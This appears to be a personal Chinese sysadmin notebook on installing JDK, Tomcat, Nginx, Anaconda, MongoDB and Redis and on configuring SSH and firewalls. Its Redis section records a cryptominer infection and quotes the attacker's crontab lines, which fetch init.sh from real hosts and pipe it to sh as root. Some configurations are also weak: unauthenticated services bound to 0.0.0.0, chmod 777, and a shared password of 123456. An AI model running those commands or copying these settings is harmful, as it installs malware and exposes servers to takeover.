2 3 4 export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 4.检查环境是否配置完成\nsource /etc/profile\njava -version\n命令行： 不会给你配JAVA_HOME\nhttps://blog.csdn.net/wan_ide/article/details/99447752\n输入命令：\n1 sudo apt install openjdk-8-jdk-headless 等待安装完成\n安装完成后用 java -version 检验是否安装成功\n1 java -version Linux如何查看JDK的安装路径\nhttps://www.cnblogs.com/kerrycode/p/4762921.html\n安装Tomcat https://blog.csdn.net/qq_34412086/article/details/88038210\n1.上传压缩包并解压\ntar -zxvf apache-tomcat-8.5.41.tar.gz\n2.配置startup.sh\n启动Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件startup.sh。在startup.sh文件最后的exec上方添加如下配置\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 3.关闭Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件shutdown.sh。配置shutdown.sh\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 4.启动\n进入到tomcat的bin目录下，./startup.sh\n后面的环境配置可以考虑不用（不知道会不会有什么问题）\n修改文件\n1 sudo gedit filename linux命令行下，在任意目录下启动Tomcat\nhttps://blog.csdn.net/qq_40794973/article/details/86591391\n==关闭TOMCAT日志的三个方法==\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n开启远程连接ssh服务端 https://jingyan.baidu.com/article/359911f5a5b74857fe0306c4.html\n首先看看自己的Ubuntu是不是已经安装或启用了ssh服务，执行ps -e | grep ssh\n我们看到只有ssh-agent 这个是ssh-client客户端服务，如果有sshd，证明你已经装好了ssh-server并已启用，当然就可以不用往下看了\n如果没有安装执行sudo apt install openssh-server开始安装，输入yes回车\n执行完了就代表安装完成了\n然后再执行ps -e | grep ssh，发现多了sshd,远程连接本电脑就已经启用了\n然后我们通过其他电脑或服务器连接本电脑执行ssh \u0026lsquo;你的用户名\u0026rsquo;@‘你的ip’，然后输入yes,然后输入密码，就成功连接了\n最后执行ls，可以看到自己熟悉的ubuntu文件了\n开启远程连接ubuntu root权限 https://blog.csdn.net/qq_35445306/article/details/78771398\nUbuntu输入su提示认证失败的解决方法（接上） https://blog.csdn.net/henren555/article/details/7546508\n1 2 3 4 5 6 7 8 9 10 11 终端下 studiogang@studiogang:~$ sudo passwd Password: \u0026lt;--- 输入安装时那个用户的密码 Enter new UNIX password: \u0026lt;--- 新的Root用户密码 Retype new UNIX password: \u0026lt;--- 重复新的Root用户密码 passwd：已成功更新密码 xshell一直断开连接：Socket error Event: 32 Error: 10053 https://blog.csdn.net/betonme/article/details/102546857\n修改/etc/ssh/sshd_config文件\n1 vim /etc/ssh/sshd_config 将port的注释#删去，重启ssh服务 ,\n1 service ssh restart 安装Nginx https://www.cnblogs.com/fengkun125/p/14142912.html\n参考尚硅谷的教程安装 用wget安装Nginx\n1 2 3 4 5 # 切换至root用户 sudo su root apt-get install nginx nginx -v service nginx start 用安装包一堆坑\nsudo make \u0026amp;\u0026amp; make install 后面那个命令会报没有权限\n未发现软件包gcc-c+：\n1 2 sudo apt install gcc sudo apt install g++ zlib 找不到：\n直接wget安装\nhttps://www.php.cn/blog/detail/13838.html\nTomcat开放对外的端口 查看已经开放的端口号\n1 firewall-cmd --list-all 对外开放访问的端口\n1 2 3 firewall-cmd --add-port=8080/tcp --permanent firewall-cmd --reload 关闭对外端口\n1 2 firewall-cmd --remove-port=80/tcp --permanent firewall-cmd --reload Windows文件换行符转Linux换行符 https://blog.csdn.net/cjf_iceking/article/details/47836201\n操作系统文件换行符\n首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为\u0026rsquo;\\r\u0026rsquo;和\u0026rsquo;\\n\u0026rsquo;。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：\n1 2 3 4 Unix和类Unix（如Linux）：换行符采用 \\n Windows和MS-DOS：换行符采用 \\r\\n Mac OS X之前的系统：换行符采用 \\r Mac OS X：换行符采用 \\n 使用cat -A [Filename] 查看\n使用命令\u0026quot;dos2unix\u0026quot;，如下所示\n1 2 [root@localhost test]# dos2unix gggggggg.txt dos2unix: converting file gggggggg.txt to UNIX format ... 安装anaconda 第一步 - 检索最新版本的Anaconda\n在Web浏览器中，转到Anaconda下载页面，可通过以下链接访问：\n1 https://www.anaconda.com/download/ 找到最新的Linux版本并复制安装程序bash脚本。\nAnaconda安装包下载\n（1）官网下载，下载速度较慢 （2）清华大学开源软件镜像站\n第二步 - 下载Anaconda Bash脚本\n以sudo非root用户身份登录到您的Ubuntu 18.04服务器，进入该/tmp目录并使用curl下载您从Anaconda网站复制的链接：\n1 2 cd /tmp curl -O https://repo.anaconda.com/archive/Anaconda3-5.2.0-Linux-x86_64.sh 或者下载完成后把bash脚本传输到linux上\n第三步 - 验证安装程序的数据完整性\n通过SHA-256校验和通过加密哈希验证确保安装程序的完整性：\n1 sha256sum Anaconda3-5.2.0-Linux-x86_64.sh 输出如下所示：\n1 09f53738b0cd3bb96f5b1bac488e5528df9906be2480fe61df40e0e0d19e3d48 Anaconda3-5.2.0-Linux-x86_64.sh 第四步 - 运行Anaconda脚本\n1 bash Anaconda3-5.2.0-Linux-x86_64.sh 将收到以下输出以查看许可协议，按ENTER键直到到达结尾。\n1 2 3 4 5 6 7 8 Welcome to Anaconda3 5.2.0 In order to continue the installation process, please review the license agreement. Please, press ENTER to continue \u0026gt;\u0026gt;\u0026gt; ... Do you approve the license terms? [yes|no] 当到达许可证末尾时，只要同意完成安装的许可证即可输入yes。\n第五步 - 完成安装过程\n一旦同意许可，系统将提示选择安装位置。可以按ENTER接受默认位置，或指定其他位置。\n1 2 3 4 5 6 7 8 Anaconda3 will now be installed into this location: /home/sammy/anaconda3 - Press ENTER to confirm the location - Press CTRL-C to abort the installation - Or specify a different location below [/home/sammy/anaconda3] \u0026gt;\u0026gt;\u0026gt; 此时，安装将继续。请注意，安装过程需要一些时间。\n第六步 - 选择选项\n安装完成后，您将收到以下输出：\n1 2 3 4 5 ... installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] \u0026gt;\u0026gt;\u0026gt; 建议输入yes以使用该conda命令。\n接下来，系统将提示下载Visual Studio Code，可以从官方VSCode网站了解更多信息。\n输入yes要安装和no拒绝安装。\n第七步 - 激活安装\n现在可以使用以下命令激活安装：\n1 source ~/.bashrc 第八步 - 测试安装\n使用此conda命令测试安装和激活：\n1 conda list 将收到通过Anaconda安装可用的所有软件包的输出。\n第九步 - 设置Anaconda环境\n可以使用该conda create命令创建Anaconda环境。例如，可以使用以下命令创建名为my_env的Python 3环境：\n1 conda create --name my_env python=3 像这样激活新环境：\n1 source activate my_env 您的命令提示符前缀将更改以反映您处于活动的Anaconda环境中，现在您已准备好开始处理项目。\n常用命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #创建虚拟环境 conda create -n your_env_name python=X.X（3.6、3.7等） #激活虚拟环境 source activate your_env_name(虚拟环境名称) #退出虚拟环境 source deactivate your_env_name(虚拟环境名称) #删除虚拟环境 conda remove -n your_env_name(虚拟环境名称) --all #查看安装了哪些包 conda list #安装包 conda install package_name(包名) conda install scrapy==1.3 # 安装指定版本的包 conda install -n 环境名 包名 # 在conda指定的某个环境中安装包 #查看当前存在哪些虚拟环境 conda env list #或 conda info -e #或 conda info --envs #检查更新当前conda conda update conda #更新anaconda conda update anaconda #更新所有库 conda update --all #更新python conda update python 安装mongodb apt安装 https://blog.csdn.net/yutu75/article/details/110941936\n基本安装\n目前最新版本为4.4版本，ubuntu20.04中默认安装的是3.6版本【可以继续基于这个版本进行学习，这块内容跳过即可】。\n安装之前建议更新下Linux源.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 1、备份源文件 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak # 2、添加源到sources.list中 sudo gedit /etc/apt/sources.list # 在打开的文本中，添加阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse # 3、更新源 sudo apt-get update 如果要在ubuntu20.04中安装最新4.4版本mongodb，则需要完成以下命令步骤：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 安装依赖包 sudo apt-get install libcurl4 openssl # 关闭和卸载原有的mongodb service mongodb stop sudo apt-get remove mongodb # 导入包管理系统使用的公钥 wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add - # 如果命令执行结果没有显示OK，则执行此命令在把上一句重新执行：sudo apt-get install gnupg # 注册mongodb源 echo \u0026#34;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.4 multiverse\u0026#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list # 更新源 sudo apt-get update # 安装mongodb sudo apt-get install -y mongodb-org=4.4.2 mongodb-org-server=4.4.2 mongodb-org-shell=4.4.2 mongodb-org-mongos=4.4.2 mongodb-org-tools=4.4.2 # 安装过程中如果提示: mongodb-org-tools : 依赖: mongodb-database-tools 但是它将不会被安装 # 终端下运行以下命令,解决: # sudo apt-get autoremove mongodb-org-mongos mongodb-org-tools mongodb-org # sudo apt-get install -y mongodb-org=4.4.2 # 创建数据存储目录 sudo mkdir -p /data/db # 修改配置，开放27017端口 sudo vim /etc/mongod.conf # 把12行附近的port=27017左边的#号去掉 启动和关闭MongoDB\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 重新加载配置，并启动mongodb sudo systemctl daemon-reload sudo systemctl start mongod # 查看运行状态 sudo systemctl status mongod # 如果mongodb状态为stop，则运行 sudo systemctl enable mongod # 停止mongodb sudo systemctl stop mongod # 重启mongodb sudo systemctl restart mongod Ubuntu安装mongo并设置账户密码\n==问题：==\nmongodb启动之后立马关闭\n1.修改/tmp目录下mongodb-23266.sock的权限\n1 2 3 4 5 cd /tmp ls -l *.sock chown root:root mongodb-23266.sock systemctl start mongod systemctl status mongod 修改之后启动mongodb，出现另外一个错误\n打开日志查看错误：\n==建议重装==\n压缩包安装 mongodb彻底卸载方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 1.停止 mongodb服务 sudo service mongod stop 2.卸载mongodb sudo apt-get remove mongodb 3.移除相关包 sudo apt-get purge mongodb-org* sudo apt-get purge mongodb sudo apt-get autoremove sudo apt-get autorclean 4.移除相关目录 sudo rm -r /var/log/mongodb sudo rm -r /var/lib/mongodb 5.查看系统还有哪些残留的文件或目录 whereis mongo whereis mongodb whereis mongod which mongo which mongodb which mongod 6.删除/data/db（我自己加的） rm -rf /data/db 安装redis ==重要的事情说三遍！：服务器上不要开放对外端口，必要时修改端口，设置密码，不然会被注入cleanfda木马==\nhttps://developer.aliyun.com/article/764565\n一、在 Ubuntu 20.04 上安装 Redis\n在 Ubuntu 上安装 Redis 非常简单直接。\nRedis 5.0 被包含在默认的 Ubuntu 20.04 软件源中。想要安装它，以 root 或者其他 sudo 身份运行下面的命令：\n1 2 sudo apt update sudo apt install redis-server 一旦安装完成，Redis 服务将会自动启动。想要检查服务的状态，输入下面的命令：\n1 sudo systemctl status redis-server 你应该看到下面这些：\n1 2 3 4 5 ● redis-server.service - Advanced key-value store Loaded: loaded (/lib/systemd/system/redis-server.service; enabled; vendor preset: enabled) Active: active (running) since Sat 2020-06-06 20:03:08 UTC; 10s ago ... 如果你的服务器上禁用 IPv6，那么 Redis 服务将会启动失败。 就这些。你已经在你的 Ubuntu 20.04 上安装并运行了 Redis。\n二、配置 Redis 远程访问\n默认情况下，Redis 不允许远程连接。你仅仅只能从127.0.0.1（localhost）连接 Redis 服务器 - Redis 服务器正在运行的机器上。\n如果你正在使用单机，数据库也同样在这台机器上，你不需要启用远程访问。\n想要配置 Redis 来接受远程访问，使用你的文本编辑器打开 Redis 配置文件 （查看redis配置文件位置）：\n1 sudo nano /etc/redis.conf 定位到以bind 127.0.0.1 ::1开头的一行，并且取消它的注释：\n1 2 # bind 0.0.0.0 ::1 如果你的服务器有局域网 IP，并且你想要 Redis 从局域网可以访问 Redis，在这一行后面加上服务器局域网 IP 地址。 保存这个文件，并且重启 Redis 服务，使应用生效：\n1 sudo systemctl restart redis-server 使用下面的命令来验证 Redis 服务器正在监听端口6379：\n1 ss -an | grep 6379 你应该能看到类似下面的信息：\n1 2 tcp LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* tcp LISTEN 0 511 [::]:6379 [::]:* 同时还要进行如下配置，防止redis运行几天后报错\nRedis踩坑——MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on\n1.直接修改redis.conf配置文件，但是更改后需要重启redis。\n修改redis.conf文件：\n（1）vim打开redis-server配置的redis.conf文件 /etc/redis/redis.conf，\n（2）使用快捷匹配模式：\n/stop-writes-on-bgsave-error定位到stop-writes-on-bgsave-error字符串所在位置，\n（3）把后面的yes设置为no。\n2.在/etc/sysctl.conf 添加一项 vm.overcommit_memory = 1 ，然后重启（或者运行命令sysctl vm.overcommit_memory=1 ）使其生效）\n使用如下命令刷新配置，使其立即生效：\n1 2 sysctl -p sysctl -w net.ipv4.route.flush=1 重启redis失效\n杀死redis进程重新restart\nps -ef | grep redis\nkill -s 9 进程id\nsystemctl restart redis.service\n还是启动不起来，打开日志查看问题\ncat /var/log/redis/redis-server.log\nWrite error saving DB on disk: No space left on device\n查看磁盘的占用情况\ndf -h\n还真满了\n寻找原因：\n从根目录下开始使用du命令查找出空间占用最大的文件\n1 2 #查看当前目录下每个文件夹所占用的空间 du -sh * 删除掉大文件之后还是不行，再次执行df -h查看磁盘使用状况，可以看到/snap下的文件使用情况都是100%\n可以看到/opt文件夹占用了极大的空间，再一层层排查发现是tomcat生成的日志文件过大\n删除掉tomcat的日志即可\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n杀死redis进程失效\n执行sysctl vm.overcommit_memory=1便可重启redis： systemctl restart redis.service\nredis启动报WARNING\n8423:M 01 Aug 10:47:50.770 # WARNING you have Transparent Huge Pages (THP) support enabled in your ernel. This will create latency and memory usage issues with Redis. To fix this issue run the commad \u0026rsquo;echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\u0026rsquo; as root, and add it to your /etc/rc.loal in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.\nroot用户执行echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\n编辑/etc/rc.local在最后一行添加echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\n重启redis： systemctl restart redis.service\n8528:M 01 Aug 11:00:34.857 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n解决方法\n方式一：设置的值128较低，需要“echo 511 \u0026gt; /proc/sys/net/core/somaxconn”命令，注意此命令只是暂时生效，如果重启后就会失效。\n方式二：永久解决Redis中The TCP backlog setting of 511 cannot be enforced告警问题，编辑/etc/sysctl.conf文件，添加net.core.somaxconn = 1024然后执行sysctl -p命令查看是否添加成功，之后重启Redis服务即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [root@mrwang redis-4.0.9]# vim /etc/sysctl.conf [root@mrwang redis-4.0.9]# sysctl -p vm.swappiness = 0 kernel.sysrq = 1 net.ipv4.neigh.default.gc_stale_time = 120 net.ipv4.conf.all.rp_filter = 0 net.ipv4.conf.default.rp_filter = 0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.lo.arp_announce = 2 net.ipv4.conf.all.arp_announce = 2 net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.core.somaxconn = 1024 systemctl status redis-server 报错\nredis-server.service: Can\u0026rsquo;t open PID file /var/run/redis/redis-server.pid (yet?) after start: No such file or directory\n解决方法如下：\nhttps://blog.csdn.net/zhangpeterx/article/details/104093275\n1 2 vi /usr/lib/systemd/system/redis.service #centos 7 nano /etc/systemd/system/redis.service #debian/ubuntu 在[Service]下新增一行ExecStartPost=/bin/sh -c \u0026quot;echo $MAINPID \u0026gt; /var/run/redis/redis.pid\u0026quot;\n1 2 3 4 5 [Service] Type=forking ExecStart=/usr/bin/redis-server /etc/redis/redis.conf ExecStop=/bin/kill -s TERM $MAINPID ExecStartPost=/bin/sh -c \u0026#34;echo $MAINPID \u0026gt; /var/run/redis/redis.pid\u0026#34; 随后重启服务：\n1 2 3 sudo systemctl daemon-reload sudo systemctl enable redis-server sudo systemctl restart redis.service redis运行时日志报错\n==Redis被挖矿脚本注入了！！！==\n3543227:M 01 Aug 2022 21:27:36.031 * 1 changes in 900 seconds. Saving\u0026hellip; 3543227:M 01 Aug 2022 21:27:36.031 * Background saving started by pid 3604362 3604362:C 01 Aug 2022 21:27:36.031 # Failed opening the RDB file crontab (in server root dir /etc) for saving: Read-only file system 3543227:M 01 Aug 2022 21:27:36.131 # Background saving error\nhttps://blog.csdn.net/zhangjunli/article/details/103817837\n1 2 3 4 5 6 7 8 9 root@VM-0-10-ubuntu:/etc/redis# redis-cli 127.0.0.1:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/etc\u0026#34; 127.0.0.1:6379\u0026gt; config set dir /var/lib/redis OK 127.0.0.1:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/var/lib/redis\u0026#34; 1 2 3 4 */2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh */3 * * * * root wget -q -O- http://en2an.top/cleanfda/init.sh | sh */4 * * * * root curl -fsSL http://195.242.111.238/cleanfda/init.sh | sh */5 * * * * root wd1 -q -O- http://195.242.111.238/cleanfda/init.sh | sh Linux管理python推荐使用miniconda 安装miniconda\nhttps://www.jianshu.com/p/47ed480daccc\n1、下载最新版 miniconda：\n1 wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh 2、在bash中安装：\n1 sh Miniconda3-latest-Linux-x86_64.sh 3、安装完成后，关闭terminal后，重新打开，输入以下命令以验证是否安装成功：\n1 conda -V 4、若要卸载，可直接删除已安装的文件夹后，并删除相应的环境变量：\n1 2 rm -rf /usr/local/miniconda/ rm -rf /usr/local/anaconda/ 删除后，打开 ~/.bashrc 文件，删除以下conda的路径变量：\n1 2 export PATH=\u0026#34; /usr/local/anaconda/bin:$PATH\u0026#34; export PATH=\u0026#34; /usr/local/miniconda3/bin:$PATH\u0026#34; 解决方案：\n打开一个终端，然后输入命令行打开bashrc文件：\n1 sudo gedit ~/.bashrc 注意这里要有sudo，不然无法编辑里面的内容。\n打开自己的安装目录/opt/software/miniconda3/bin，输入指令pwd查看路径。\n在bashrc文件中输入：\n1 export PATH=\u0026#34;/opt/software/miniconda3/bin:$PATH\u0026#34; 保存关闭bashrc文件，在命令行输入：\n1 source ~/.bashrc 随后检测一下：\n1 conda --version 如上图所示，成功。\n常用指令\nconda activate GIS\nconda create -n Name python=3.x(2.x)\nconda install xx (pip install xx)\nconda deactivate\n新建用户 如下操作都是在root用户下进行的\n新增单个用户 1 useradd user1 设置密码\n1 passwd user1 设置密码的时候，有的密码无法通过字典检查。 可以通过修改：/etc/security/pwquality.conf 文件 关闭字典检查。\n修改完成之后： 但是不建议这么修改。建议换个密码。\n删除帐号 删除一个已有的用户账号使用userdel命令，其格式如下：\n1 userdel 选项 用户名 常用的选项是 -r，它的作用是把用户的主目录一起删除。\n例如：\n1 # userdel -r sam 此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。\n/etc/passwd文件是用户管理工作涉及的最重要的一个文件。\nLinux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ＃ cat /etc/passwd root❌0:0:Superuser:/: daemon❌1:1:System daemons:/etc: bin❌2:2:Owner of system commands:/bin: sys❌3:3:Owner of system files:/usr/sys: adm❌4:4:System accounting:/usr/adm: uucp❌5:5:UUCP administrator:/usr/lib/uucp: auth❌7:21:Authentication administrator:/tcb/files/auth: cron❌9:16:Cron daemon:/usr/spool/cron: listen❌37:4:Network daemon:/usr/net/nls: lp❌71:18:Printer administrator:/usr/spool/lp: sam❌200:50:Sam san:/home/sam:/bin/sh 从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n1 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell 添加批量用户 （1）先编辑一个文本用户文件。\n每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：\n1 2 3 4 5 6 user001::600:100:user:/home/user001:/bin/bash user002::601:100:user:/home/user002:/bin/bash user003::602:100:user:/home/user003:/bin/bash user004::603:100:user:/home/user004:/bin/bash user005::604:100:user:/home/user005:/bin/bash user006::605:100:user:/home/user006:/bin/bash （2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：\n1 # newusers \u0026lt; user.txt 然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。\n（3）执行命令/usr/sbin/pwunconv。\n将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。\n1 # pwunconv （4）编辑每个用户的密码对照文件。\n格式为：\n1 用户名:密码 实例文件 passwd.txt 内容如下：\n1 2 3 4 5 6 user001:123456 user002:123456 user003:123456 user004:123456 user005:123456 user006:123456 （5）以 root 身份执行命令 /usr/sbin/chpasswd。\n创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。\n1 # chpasswd \u0026lt; passwd.txt （6）确定密码经编码写入/etc/passwd的密码栏后。\n执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。\n1 # pwconv 这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。\nCentos 换国内源 https://blog.csdn.net/sinat_31089473/article/details/105929293\n1 2 3 4 5 6 7 8 备份一份文件 cp /etc/yum.repos.d/CentOS-Base.repo.backup /etc/yum.repos.d/CentOS-Base.repo 下载国内源 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 生成缓存 yum makecache 安装Java https://www.cnblogs.com/lumama520/p/11058927.html\n1 2 3 4 5 6 7 8 9 10 11 解压压缩包 tar -zxvf /home/binbin/jdk-8u301-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量 vim /etc/profile 使环境变量生效 source /etc/profile 检查Java版本 java -version 安装Tomcat https://blog.csdn.net/qq_21077715/article/details/85541685\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 新建文件夹 mkdir usr/local/tomcat9 解压压缩包 tar -zxvf /home/binbin/apache-tomcat-9.0.54.tar.gz -C /usr/local/tomcat9/ 启动tomcat /usr/local/tomcat9/apache-tomcat-9.0.54/bin/startup.sh 开放防火墙端口 firewall-cmd --zone=public --add-port=8080/tcp --permanent firewall-cmd --reload 查看防火墙信息 firewall-cmd --list-all 开放对外端口 ==注意：centos7自带的防火墙已经不是iptables了，改成了firewalld== ufw也是一种防火墙\n执行命令时，出现firewalld is not running的报错，用以下命令将firewalld起起来即可\n1.查看firewalld状态：systemctl status firewalld，如果是dead状态，即防火墙未开启。\n2.开启防火墙：systemctl start firewalld\n3.确认firewalld状态:systemctl status firewalld\n4.开放默认端口号 3306，出现success表示成功\n1 firewall-cmd --permanent --zone=public --add-port=3306/tcp 5.重新加载防火墙配置：firewall-cmd --reload\n6.设置firewalld开机启动：systemctl enable firewalld\n7.关闭防火墙：systemctl stop firewalld\n8.查看该机器有几个端口开放：firewall-cmd --list-all、firewall-cmd --zone=public --list-ports\n经过上述操作后外网还是访问不到tomcat\n可能是服务没开？\nhttps://www.cnblogs.com/cui0614/p/12746383.html\n但是开了之后还不行\n==主要原因是我是在腾讯云上买的服务器，所以要在腾讯云上面先开端口号~！！！！==\n因为centos7自带的防火墙已经不是iptables了，改成了firewalld，所以不用下面的这种方法解决\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Generated by iptables-save v1.4.7 on Tue Aug 20 10:09:45 2019 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [19:1438] -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 20001 -j ACCEPT -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j REJECT --reject-with icmp-host-prohibited COMMIT # Completed on Tue Aug 20 10:09:45 2019 注意这一行-A INPUT -j REJECT --reject-with icmp-host-prohibited，如果我们添加的规则在这行之下那么就不会生效\n解决办法：在-A INPUT -j REJECT --reject-with icmp-host-prohibited之前加入我们的规则即可\n如果防火墙放行了端口，但是仍然访问不到的话，可能是因为添加规则的时候，用的是iptables -A 选项，这样，增加的规则会排列在 第6条 规则后面，虽然service iptables status显示放行了端口，但是实际上，由于第六条规则的原因，新增加的这条并没有起作用。\n改为使用iptables -I 插入规则即可，将规则添加到 第6条 之前，就可以生效了。\n但是当我执行service iptables status命令时出现如下错误：\n1 2 Redirecting to /bin/systemctl status iptables.service Unit iptables.service could not be found. 原因是没有安装iptables-services\nhttps://blog.csdn.net/y368769/article/details/104490697/\n安装MongoDB https://www.jianshu.com/p/994bc7b19b26\nhttps://www.cnblogs.com/xiaoyaojinzhazhadehangcheng/p/12156597.html\n1.解压\n1 tar -zxvf /home/binbin/mongodb-linux-x86_64-4.0.0.tgz -C /usr/local/ 之后装的时候把文件目录改个名，因为之后要有很多关于这个目录的配置\n1 2 [root@VM-4-12-centos ~]# cd /usr/local [root@VM-4-12-centos local]# mv mongodb-linux-x86_64-4.0.0/ mongodb 2.修改配置文件\n1 vim /etc/profile 在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容:\n1 2 #set mongodb export PATH=/usr/local/mongodb-linux-x86_64-4.0.0/bin:$PATH 使环境变量生效\n1 source /etc/profile 3.创建数据库目录\n1 2 3 4 5 6 $ cd /usr/local/mongodb $ touch mongodb.conf $ mkdir db $ mkdir log $ cd log $ touch mongodb.log 4.修改mongodb配置文件\n1 vim /usr/local/mongodb/mongodb.conf 添加以下内容\n1 2 3 4 5 6 7 8 9 10 11 port=27017 #端口 dbpath= /usr/local/mongodb/db #数据库存文件存放目录 logpath= /usr/local/mongodb/log/mongodb.log #日志文件存放路径 logappend=true #使用追加的方式写日志 fork=true #以守护进程的方式运行，创建服务器进程 maxConns=100 #最大同时连接数 noauth=true #不启用验证 journal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。 #即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。 storageEngine=wiredTiger #存储引擎有mmapv1、wiretiger、mongorocks bind_ip = 0.0.0.0 #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB 5.设置文件夹权限\n1 2 3 $ cd /usr/local/mongodb $ chmod 777 db $ chmod 777 log 6.启动mongodb\n1 mongod --config /usr/local/mongodb/mongodb.conf 7.安装完之后记得开放端口\n部署项目 https://www.cnblogs.com/shu-java-net/p/13886242.html\n1.Springboot 先打包成jar包\n2.放到服务器上\n1 nohup java -jar NettyAPI.jar \u0026amp; nohup 意思是不挂断运行命令,当账户退出或终端关闭时,程序仍然运行，\n当用 nohup 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。\n3.结束项目\n1 ps -aux | grep java 把这个端口kill掉\n1 kill -s 9 4287 4.使用nginx：外网访问内网项目\n1 nginx -s reload 写 .sh 自动启动 